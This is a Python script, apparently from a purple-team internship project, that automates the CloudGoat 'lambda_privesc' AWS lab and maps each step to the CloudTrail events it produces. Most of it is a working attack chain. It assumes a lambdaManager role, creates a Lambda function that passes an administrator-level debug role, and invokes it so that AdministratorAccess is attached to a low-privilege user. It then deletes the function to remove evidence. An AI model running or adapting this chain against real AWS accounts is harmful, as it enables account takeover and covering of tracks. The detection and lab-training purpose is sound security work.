"""
Purple Team Automation — Scenario 2: Over-permissioned Lambda via PassRole
CloudGoat scenario: lambda_privesc
Author: Omar (EY Internship — Purple Team Project)

Attack chain:
  Step 1 — Recon: enumerate IAM roles available to chris
  Step 2 — Assume lambdaManager role (chris has sts:AssumeRole permission)
  Step 3 — Create a Lambda function, passing the debug role (iam:PassRole)
  Step 4 — Invoke the Lambda — attacker code runs under debug role (AdminAccess)
  Step 5 — Lambda attaches AdministratorAccess policy directly to chris
  Step 6 — Cleanup: delete the Lambda function

CloudTrail events produced:
  Step 1 → iam:ListRoles                                  (chris identity)
  Step 2 → sts:AssumeRole                                 (chris identity)
  Step 3 → lambda:CreateFunction + implicit iam:PassRole  (lambdaManager role)
  Step 4 → lambda:InvokeFunction                          (lambdaManager role)
  Step 5 → iam:AttachUserPolicy                           (debug role — NOT chris)
  Step 6 → lambda:DeleteFunction                          (lambdaManager role)

Key insight: Step 5 (the actual privilege escalation) appears in CloudTrail
under the debug role's identity, not chris — making it hard to detect without
correlating multiple events across different identities.

Output: timestamped terminal output + attack_log_scenario2.txt
"""

import boto3
import json
import zipfile
import sys
import time
from datetime import datetime

# ============================================================
# CONFIG — edit these values before running on the target lab
# ============================================================
REGION           = "us-east-1"
ROLE_ARN         = "arn:aws:iam::964525385628:role/cg-debug-role-cgidrykntaih8c"
LAMBDA_MGR_ROLE  = "arn:aws:iam::964525385628:role/cg-lambdaManager-role-cgidrykntaih8c"
FUNCTION_NAME    = "purple-team-attack-fn"
TARGET_USER      = "chris-cgidrykntaih8c"
LOG_FILE         = "attack_log_scenario2.txt"
PROFILE          = "chris"
# ============================================================

# Use chris's profile as starting point
boto3.setup_default_session(profile_name=PROFILE)


def log(message):
    """Print to terminal and write to log file simultaneously."""
    timestamped = f"[{datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}] {message}"
    print(timestamped)
    with open(LOG_FILE, "a") as f:
        f.write(timestamped + "\n")


# ----------------------------------------------------------
# Step 1: Recon — enumerate IAM roles as chris
# ----------------------------------------------------------
def recon(region):
    log("STEP 1 — Recon: enumerating IAM roles as chris")
    log("API call: iam:ListRoles (chris identity)")

    iam = boto3.client('iam', region_name=region)

    try:
        roles = iam.list_roles()['Roles']
        log(f"Found {len(roles)} IAM role(s):")
        for role in roles:
            log(f"  - {role['RoleName']}")
            log(f"    ARN: {role['Arn']}")
    except Exception as e:
        log(f"ERROR — Could not list IAM roles: {e}")


# ----------------------------------------------------------
# Step 2: Assume lambdaManager role
# ----------------------------------------------------------
def assume_lambda_manager_role(role_arn, region):
    log(f"STEP 2 — Assuming lambdaManager role")
    log(f"API call: sts:AssumeRole (chris identity)")
    log(f"Role: {role_arn}")

    sts = boto3.client('sts', region_name=region)

    try:
        response = sts.assume_role(
            RoleArn=role_arn,
            RoleSessionName='attack-session'
        )

        creds = response['Credentials']
        log(f"SUCCESS — Assumed lambdaManager role:")
        log(f"  Access Key : {creds['AccessKeyId'][:6]}... (truncated)")
        log(f"  Expiration : {creds['Expiration']}")

        # Create a new boto3 session using the assumed role credentials
        lambda_mgr_session = boto3.Session(
            aws_access_key_id     = creds['AccessKeyId'],
            aws_secret_access_key = creds['SecretAccessKey'],
            aws_session_token     = creds['SessionToken'],
            region_name           = region
        )

        # Verify the new identity
        sts_check = lambda_mgr_session.client('sts')
        identity  = sts_check.get_caller_identity()
        log(f"  Now operating as: {identity['Arn']}")

        return lambda_mgr_session

    except Exception as e:
        log(f"ERROR — AssumeRole failed: {e}")
        return None


# ----------------------------------------------------------
# Step 3: Create Lambda with debug role (PassRole moment)
# ----------------------------------------------------------
def create_malicious_lambda(session, role_arn, function_name, region):
    log(f"STEP 3 — Creating Lambda function: {function_name}")
    log(f"Attaching privileged debug role: {role_arn}")
    log(f"API call: lambda:CreateFunction + implicit iam:PassRole (lambdaManager identity)")
    log(f"Key: debug role has AdministratorAccess — Lambda will run under its identity")

    # Malicious code — runs under debug role's AdminAccess identity
    # Attaches AdministratorAccess directly to chris's IAM user
    malicious_code = """
import boto3

def handler(event, context):
    iam      = boto3.client('iam')
    username = event.get('username', '')

    if not username:
        return {'statusCode': 400, 'error': 'No username provided'}

    try:
        iam.attach_user_policy(
            UserName=username,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        return {
            'statusCode': 200,
            'message': f'AdministratorAccess successfully attached to {username}'
        }
    except Exception as e:
        return {'statusCode': 500, 'error': str(e)}
"""

    # Build zip in memory — Lambda requires a zip file
    zip_path = "/tmp/lambda_payload.zip"
    with zipfile.ZipFile(zip_path, 'w') as z:
        z.writestr("handler.py", malicious_code)

    with open(zip_path, 'rb') as f:
        zip_bytes = f.read()

    lambda_client = session.client('lambda', region_name=region)

    try:
        response = lambda_client.create_function(
            FunctionName=function_name,
            Runtime='python3.11',
            Role=role_arn,           # ← PassRole triggered here implicitly
            Handler='handler.handler',
            Code={'ZipFile': zip_bytes},
            Timeout=30
        )

        function_arn = response['FunctionArn']
        log(f"SUCCESS — Lambda function created:")
        log(f"  Function ARN  : {function_arn}")
        log(f"  Execution role: {role_arn}")
        log(f"Waiting 5 seconds for Lambda to become active...")
        time.sleep(5)

        return function_arn

    except Exception as e:
        log(f"ERROR — CreateFunction failed: {e}")
        return None


# ----------------------------------------------------------
# Step 4: Invoke the Lambda to escalate chris's privileges
# ----------------------------------------------------------
def invoke_lambda(session, function_name, target_user, region):
    log(f"STEP 4 — Invoking Lambda function: {function_name}")
    log(f"API call: lambda:InvokeFunction (lambdaManager identity)")
    log(f"Target user: {target_user}")
    log(f"Note: AttachUserPolicy inside Lambda fires under debug role identity — NOT chris")

    lambda_client = session.client('lambda', region_name=region)
    payload       = json.dumps({"username": target_user})

    try:
        response = lambda_client.invoke(
            FunctionName=function_name,
            InvocationType='RequestResponse',
            Payload=payload
        )

        result = json.loads(response['Payload'].read())

        if result.get('statusCode') == 200:
            log(f"SUCCESS — Privilege escalation complete:")
            log(f"  {result.get('message', '')}")
            log(f"  Chris now has AdministratorAccess on the account")
        else:
            log(f"ERROR — Lambda returned: {result.get('error', 'unknown')}")

        return result

    except Exception as e:
        log(f"ERROR — InvokeFunction failed: {e}")
        return None


# ----------------------------------------------------------
# Step 5: Verify — confirm chris now has AdminAccess
# ----------------------------------------------------------
def verify_escalation(target_user, region):
    log(f"STEP 5 — Verifying privilege escalation for user: {target_user}")
    log(f"API call: iam:ListAttachedUserPolicies (chris identity)")

    iam = boto3.client('iam', region_name=region)

    try:
        policies = iam.list_attached_user_policies(
            UserName=target_user
        )['AttachedPolicies']

        log(f"Policies attached to {target_user}:")
        for policy in policies:
            log(f"  - {policy['PolicyName']} ({policy['PolicyArn']})")

        admin_attached = any(
            p['PolicyArn'] == 'arn:aws:iam::aws:policy/AdministratorAccess'
            for p in policies
        )

        if admin_attached:
            log(f"CONFIRMED — AdministratorAccess is attached to {target_user}")
            log(f"Chris now has full admin access to the AWS account")
        else:
            log(f"WARNING — AdministratorAccess not found — escalation may have failed")

    except Exception as e:
        log(f"ERROR — Could not verify: {e}")


# ----------------------------------------------------------
# Step 6: Cleanup — delete the Lambda function
# ----------------------------------------------------------
def cleanup(session, function_name, region):
    log(f"STEP 6 — Cleanup: deleting Lambda function {function_name}")
    log(f"API call: lambda:DeleteFunction (lambdaManager identity)")
    log(f"Note: attacker deletes the function to remove evidence")

    lambda_client = session.client('lambda', region_name=region)

    try:
        lambda_client.delete_function(FunctionName=function_name)
        log(f"SUCCESS — Lambda function deleted")
    except Exception as e:
        log(f"ERROR — DeleteFunction failed (clean up manually): {e}")
        log(f"Run: aws lambda delete-function --function-name {function_name}")


# ----------------------------------------------------------
# Main — wire all steps together
# ----------------------------------------------------------
def main():
    log("=" * 60)
    log("Purple Team — Scenario 2: Lambda PassRole Privilege Escalation")
    log("=" * 60)
    log(f"Region          : {REGION}")
    log(f"Debug role ARN  : {ROLE_ARN}")
    log(f"LambdaMgr role  : {LAMBDA_MGR_ROLE}")
    log(f"Function name   : {FUNCTION_NAME}")
    log(f"Target user     : {TARGET_USER}")
    log(f"Starting profile: {PROFILE}")
    log("=" * 60)

    # Validate config
    if "REPLACE" in ROLE_ARN:
        log("ERROR — ROLE_ARN not configured. Edit the CONFIG section.")
        sys.exit(1)

    # Step 1 — Recon as chris
    recon(REGION)

    # Step 2 — Assume lambdaManager role
    lambda_mgr_session = assume_lambda_manager_role(LAMBDA_MGR_ROLE, REGION)
    if not lambda_mgr_session:
        log("ABORTED — Could not assume lambdaManager role. Stopping.")
        sys.exit(1)

    # Step 3 — Create malicious Lambda with debug role
    function_arn = create_malicious_lambda(
        lambda_mgr_session, ROLE_ARN, FUNCTION_NAME, REGION
    )
    if not function_arn:
        log("ABORTED — Could not create Lambda function. Stopping.")
        sys.exit(1)

    # Step 4 — Invoke Lambda to escalate chris's privileges
    result = invoke_lambda(lambda_mgr_session, FUNCTION_NAME, TARGET_USER, REGION)
    if not result:
        log("ABORTED — Invocation failed. Stopping.")
        cleanup(lambda_mgr_session, FUNCTION_NAME, REGION)
        sys.exit(1)

    # Step 5 — Verify chris now has AdminAccess
    verify_escalation(TARGET_USER, REGION)

    # Step 6 — Cleanup
    cleanup(lambda_mgr_session, FUNCTION_NAME, REGION)

    log("=" * 60)
    log("ATTACK CHAIN COMPLETE")
    log(f"Review {LOG_FILE} for full timestamped output")
    log("=" * 60)


if __name__ == "__main__":
    main()
